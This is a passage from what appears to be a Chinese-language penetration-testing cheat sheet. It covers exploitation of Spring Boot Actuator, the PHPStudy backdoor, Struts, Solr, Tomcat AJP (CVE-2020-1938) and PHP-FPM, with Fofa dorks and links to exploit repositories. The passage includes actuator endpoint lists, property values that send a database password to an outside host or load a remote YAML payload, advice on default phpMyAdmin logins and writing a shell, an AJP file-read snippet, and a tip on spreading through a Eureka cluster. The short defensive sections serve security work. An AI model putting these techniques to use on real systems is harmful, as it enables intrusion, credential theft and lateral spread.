&lt;p&gt;可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/trace
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/health
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/loggers
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/metrics
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/autoconfig
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/heapdump
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/threaddump
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/env
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dump
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/configprops
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/mappings
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/auditevents
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/beans
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/jolokia
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/cloudfoundryapplication
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/hystrix.stream
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/auditevents
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/beans
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/health
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/conditions
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/configprops
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/env
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/loggers
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/heapdump
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/threaddump
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/metrics
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/scheduledtasks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/httptrace
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/mappings
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/jolokia
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/actuator/hystrix.stream
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/auditevents
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/beans
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/health
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/conditions
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/configprops
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/env
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/info
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/loggers
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/heapdump
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/threaddump
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/metrics
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/scheduledtasks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/httptrace
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/mappings
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/jolokia
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/monitor/hystrix.stream
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这里通过 &lt;code&gt;/env&lt;/code&gt; + &lt;code&gt;/refresh&lt;/code&gt; 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作&lt;/p&gt;
&lt;p&gt;里面就有操作空间, 很像fastjson反序列化&lt;/p&gt;
&lt;p&gt;2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok&lt;/p&gt;
&lt;p&gt;springboot Information Disclosure
&lt;a class=&#34;link&#34; href=&#34;https://gist.github.com/UUUUnotfound/fed628b074859997d6970717ddd7fbf3&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gist.github.com/UUUUnotfound/fed628b074859997d6970717ddd7fbf3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;eureka.client.serviceUrl.defaultZone=http://${somedb.password}@127.0.0.1:5000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;spring.cloud.bootstrap.location=http://${somedb.password}@artsploit.com/yaml-payload.yml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群&lt;/p&gt;
&lt;p&gt;eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.开启Spring Boot Actuators权限校验&lt;/p&gt;
&lt;p&gt;3.前置WAF进行防护&lt;/p&gt;
&lt;h2 id=&#34;phpstudy-后门远程代码执行&#34;&gt;Phpstudy 后门远程代码执行&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Phpstudy 是一个国产的php快速集成环境, 主要用于学习测试, 但是也有很多人直接拿来部署服务器&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Phpstudy&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;phpStudy 探针&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;phpStudy 探针&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PhpStudy 后门分析
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/1044/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/1044/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本
&lt;a class=&#34;link&#34; href=&#34;https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.phpstudy 根目录下面有个&lt;code&gt;l.php&lt;/code&gt; , 里面有探针, 可以作为判断条件&lt;/p&gt;
&lt;p&gt;2.还有个&lt;code&gt;/phpmyadmin&lt;/code&gt;目录, 一般密码都是&lt;code&gt;root/root&lt;/code&gt; 后台&lt;code&gt;mysql outfile&lt;/code&gt; 写 shell 就ok了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时删除phpstudy&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;p&gt;3.不要用phpstduy搭建生产环境&lt;/p&gt;
&lt;h2 id=&#34;struts-系列漏洞&#34;&gt;Struts 系列漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Struts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Struts&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Struts&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.action&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.do&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.action!xxxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check
&lt;a class=&#34;link&#34; href=&#34;https://github.com/coffeehb/struts2_check/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/coffeehb/struts2_check/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Struts2&amp;quot;&lt;/code&gt; (这个不太准)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Struts2代码执行漏洞整理 – 简书
&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/d7cd8a2a992b&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.jianshu.com/p/d7cd8a2a992b&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;struts-scan/struts-scan.py at master · Lucifer1993/struts-scan&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Lucifer1993/struts-scan/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Lucifer1993/struts-scan/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级到最新版&lt;/p&gt;
&lt;p&gt;2.不建议使用Struts&lt;/p&gt;
&lt;h2 id=&#34;solr-系列漏洞&#34;&gt;Solr 系列漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Solr&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Solr&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Solr&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/218730.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/vuls/218730.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/1009/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/1009/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;veracode-research/solr-injection: Apache Solr Injection Research
&lt;a class=&#34;link&#34; href=&#34;https://github.com/veracode-research/solr-injection&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/veracode-research/solr-injection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)
&lt;a class=&#34;link&#34; href=&#34;https://github.com/jas502n/CVE-2019-12409&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/jas502n/CVE-2019-12409&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit
&lt;a class=&#34;link&#34; href=&#34;https://github.com/mogwailabs/mjet&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/mogwailabs/mjet&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.看到锤就完事了, 漏洞太多了, 一片一片的&lt;/p&gt;
&lt;p&gt;2.遇到&lt;code&gt;mjet&lt;/code&gt;连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用&lt;code&gt;socat&lt;/code&gt;进行流量转发, 后记里面有具体操作&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级到最新版&lt;/p&gt;
&lt;p&gt;2.不要对外开放敏感端口&lt;/p&gt;
&lt;h2 id=&#34;tomcat-本地文件包含漏洞-cve-2020-1938&#34;&gt;Tomcat 本地文件包含漏洞 (CVE-2020-1938)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Tomcat 是常见的Web 容器, 用户量非常巨大, Tomcat 8009 ajp端口一直是默认开放的, 这个漏洞存在很多年了, 这次应该有奇效&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Tomcat 6&lt;/p&gt;
&lt;p&gt;Apache Tomcat 7 &amp;lt; 7.0.100&lt;/p&gt;
&lt;p&gt;Apache Tomcat 8 &amp;lt; 8.5.51&lt;/p&gt;
&lt;p&gt;Apache Tomcat 9 &amp;lt; 9.0.31&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tomcat&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;8009&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ajp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\x04\x01\xf4\x00\x15&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;protocol=&amp;quot;ajp&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心
&lt;a class=&#34;link&#34; href=&#34;https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;0nise/CVE-2020-1938: CVE-2020-1938
&lt;a class=&#34;link&#34; href=&#34;https://github.com/0nise/CVE-2020-1938&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/0nise/CVE-2020-1938&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了&lt;/p&gt;
&lt;p&gt;主要代码也就这&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;t = Tomcat(&amp;#34;127.0.0.1&amp;#34;, 8009)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;_, data = t.perform_request(&amp;#39;/&amp;#39;, attributes=[
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {&amp;#39;name&amp;#39;: &amp;#39;req_attribute&amp;#39;, &amp;#39;value&amp;#39;: [&amp;#39;javax.servlet.include.request_uri&amp;#39;, &amp;#39;/&amp;#39;]}, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {&amp;#39;name&amp;#39;: &amp;#39;req_attribute&amp;#39;, &amp;#39;value&amp;#39;: [&amp;#39;javax.servlet.include.path_info&amp;#39;, &amp;#34;/WEB-INF/web.xml&amp;#34;]}, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {&amp;#39;name&amp;#39;: &amp;#39;req_attribute&amp;#39;, &amp;#39;value&amp;#39;: [&amp;#39;javax.servlet.include.servlet_path&amp;#39;, &amp;#39;/&amp;#39;]}, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;print(&amp;#39;----------------------------&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;print(&amp;#34;&amp;#34;.join([bytes.decode(d.data) for d in data]))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;2.通过修改这里的路径可以进行Webapp切换, 默认是&lt;code&gt;ROOT/&lt;/code&gt;, 需要切换应用就改成 &lt;code&gt;/admin/&lt;/code&gt; 之类的&lt;/p&gt;
&lt;p&gt;3.通常检测的时候, 尽量保持&lt;code&gt;t.perform_request(&#39;/&#39;&lt;/code&gt; , 有的poc喜欢用 &lt;code&gt;/addsd&lt;/code&gt; 这种的不存在的路径, 有些情况会读不到文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级到最新版&lt;/p&gt;
&lt;p&gt;2.屏蔽8009端口对外开放&lt;/p&gt;
&lt;h2 id=&#34;php-fpm-远程代码执行漏洞&#34;&gt;PHP-FPM 远程代码执行漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现, 向目标服务器 URL 发送 %0a 符号时, 服务返回异常, 疑似存在漏洞&lt;/p&gt;
&lt;p&gt;2019年10月23日, github公开漏洞相关的详情以及exp.当nginx配置不当时, 会导致php-fpm远程任意代码执行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nginx + FPM + PHP7&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nginx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PHP&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nextcloud&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析
